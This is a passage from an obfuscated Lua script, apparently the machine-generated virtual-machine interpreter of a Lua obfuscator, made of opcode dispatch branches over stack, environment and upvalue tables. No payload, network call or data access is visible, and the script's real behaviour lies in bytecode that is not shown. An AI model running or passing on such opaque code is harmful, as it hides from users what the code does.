;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];end elseif (Enum<=172) then if (Enum>171) then local A;Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]]/Inst[4] ;VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]]/Inst[4] ;VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];else local A;Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]= #Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]= #Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];end elseif (Enum<=173) then local Results;local Edx;local Results,Limit;local B;local A;Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results,Limit=_R(Stk[A](Stk[A + 1 ]));Top=(Limit + A) -1 ;Edx=0;for Idx=A,Top do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results={Stk[A](Unpack(Stk,A + 1 ,Top))};Edx=0;for Idx=A,Inst[4] do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];elseif (Enum>174) then local A;Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];else Stk[Inst[2]]=Upvalues[Inst[3]];end elseif (Enum<=185) then if (Enum<=180) then if (Enum<=177) then if (Enum==176) then Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];else local Edx;local Results;local A;Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results={Stk[A](Stk[A + 1 ])};Edx=0;for Idx=A,Inst[4] do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];end elseif (Enum<=178) then local A=Inst[2];Top=(A + Varargsz) -1 ;for Idx=A,Top do local VA=Vararg[Idx-A ];Stk[Idx]=VA;end elseif (Enum>179) then Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];else local K;local B;local A;A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];B=Inst[3];K=Stk[B];for Idx=B + 1 ,Inst[4] do K=K   .. Stk[Idx] ;end Stk[Inst[2]]=K;VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];end elseif (Enum<=182) then if (Enum==181) then local A;Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];else Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];end elseif (Enum<=183) then local A=Inst[2];local Step=Stk[A + 2 ];local Index=Stk[A] + Step ;Stk[A]=Index;if (Step>0) then if (Index<=Stk[A + 1 ]) then VIP=Inst[3];Stk[A + 3 ]=Index;end elseif (Index>=Stk[A + 1 ]) then VIP=Inst[3];Stk[A + 3 ]=Index;end elseif (Enum>184) then local A;Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];else local A;Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];if (Stk[Inst[2]]==Inst[4]) then VIP=VIP + 1 ;else VIP=Inst[3];end end elseif (Enum<=190) then if (Enum<=187) then if (Enum>186) then local A;Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];else local A;A=Inst[2];Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]= #Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];end elseif (Enum<=188) then local A;Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];if (Stk[Inst[2]]~=Inst[4]) then VIP=VIP + 1 ;else VIP=Inst[3];end elseif (Enum>189) then Stk[Inst[2]]=Stk[Inst[3]]/Stk[Inst[4]] ;else local Edx;local Results;local B;local A;A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A]();VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results={Stk[A](Stk[A + 1 ])};Edx=0;for Idx=A,Inst[4] do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];end elseif (Enum<=192) then if (Enum>191) then Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];else local Edx;local Results,Limit;local B;local A;Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results,Limit=_R(Stk[A](Unpack(Stk,A + 1 ,Inst[3])));Top=(Limit + A) -1 ;Edx=0;for Idx=A,Top do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Top));VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];end elseif (Enum<=193) then local A;A=Inst[2];Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]= #Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];elseif (Enum>194) then Stk[Inst[2]]=Inst[3]^Stk[Inst[4]] ;VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]]%Stk[Inst[4]] ;VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]] -Inst[4] ;VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3]^Stk[Inst[4]] ;VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]]%Stk[Inst[4]] ;VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]] -Stk[Inst[4]] ;VIP=VIP + 1 ;Inst=Instr[VIP];if (Inst[2]<Stk[Inst[4]]) then VIP=VIP + 1 ;else VIP=Inst[3];end else local A;Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];if (Stk[Inst[2]]~=Inst[4]) then VIP=VIP + 1 ;else VIP=Inst[3];end end elseif (Enum<=215) then if (Enum<=205) then if (Enum<=200) then if (Enum<=197) then if (Enum>196) then local Results;local Edx;local Results,Limit;local B;local A;Stk[Inst[2]]= #Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Upvalues[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]] -Inst[4] ;VIP=VIP + 1 ;Inst=Instr[VIP];Upvalues[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Stk[Inst[4]]];VIP=VIP + 1 ;Inst=Instr[VIP];for Idx=Inst[2],Inst[3] do Stk[Idx]=nil;end VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results,Limit=_R(Stk[A](Stk[A + 1 ]));Top=(Limit + A) -1 ;Edx=0;for Idx=A,Top do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results={Stk[A](Unpack(Stk,A + 1 ,Top))};Edx=0;for Idx=A,Inst[4] do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];else local B;local A;Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];do return;end end elseif (Enum<=198) then local A;A=Inst[2];Stk[A]=Stk[A]();VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];if Stk[Inst[2]] then VIP=VIP + 1 ;else VIP=Inst[3];end elseif (Enum==199) then local A;A=Inst[2];Stk[A]=Stk[A]();VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];if Stk[Inst[2]] then VIP=VIP + 1 ;else VIP=Inst[3];end else local Edx;local Results;local A;Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results={Stk[A](Stk[A + 1 ])};Edx=0;for Idx=A,Inst[4] do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];end elseif (Enum<=202) then if (Enum>201) then local Results;local Edx;local Results,Limit;local B;local A;Stk[Inst[2]]= #Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Upvalues[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]] -Inst[4] ;VIP=VIP + 1 ;Inst=Instr[VIP];Upvalues[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Stk[Inst[4]]];VIP=VIP + 1 ;Inst=Instr[VIP];for Idx=Inst[2],Inst[3] do Stk[Idx]=nil;end VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results,Limit=_R(Stk[A](Stk[A + 1 ]));Top=(Limit + A) -1 ;Edx=0;for Idx=A,Top do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results={Stk[A](Unpack(Stk,A + 1 ,Top))};Edx=0;for Idx=A,Inst[4] do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];else local A;Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A]();VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];VIP=VIP + 1 